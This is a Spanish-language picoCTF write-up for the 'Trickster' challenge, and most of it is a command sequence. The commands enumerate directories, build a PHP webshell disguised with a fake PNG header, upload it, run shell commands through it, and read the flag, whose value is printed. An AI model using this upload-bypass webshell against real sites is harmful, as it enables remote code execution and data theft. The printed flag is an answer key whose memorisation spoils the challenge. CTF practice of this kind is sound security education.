## Trickster

### Descripción
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
### Solución

#### Solución 1 
```
# 1. Enumerar directorios ocultos
gobuster dir -u http://atlas.picoctf.net:<PUERTO> -w /usr/share/wordlists/dirb/common.txt
# Encontrarás: /instructions.txt y /uploads/

# 2. Crear webshell (archivo: shell.png.php)
echo -e "PNG\n<?php system(\$_GET['cmd']); ?>" > shell.png.php

# 3. Subir el archivo por el formulario web

# 4. Ejecutar comandos
curl "http://atlas.picoctf.net:<PUERTO>/uploads/shell.png.php?cmd=ls%20.."
# Busca archivo .txt con nombre aleatorio (ej: MQZWCYZWGI2WE.txt)

# 5. Leer la flag
curl "http://atlas.picoctf.net:<PUERTO>/uploads/shell.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt"
# Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```

### Referencias

-